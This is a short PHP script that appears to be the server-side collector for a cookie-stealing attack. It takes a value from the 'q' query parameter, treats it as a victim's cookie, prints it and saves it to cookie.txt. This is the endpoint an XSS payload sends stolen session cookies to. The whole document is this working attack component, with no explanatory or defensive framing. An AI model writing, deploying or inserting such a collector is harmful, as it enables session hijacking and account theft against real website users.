<?php 
$cookie = $_GET['q']; 
var_dump($cookie); 
$myFile = "cookie.txt"; 
file_put_contents($myFile, $cookie); 
?> 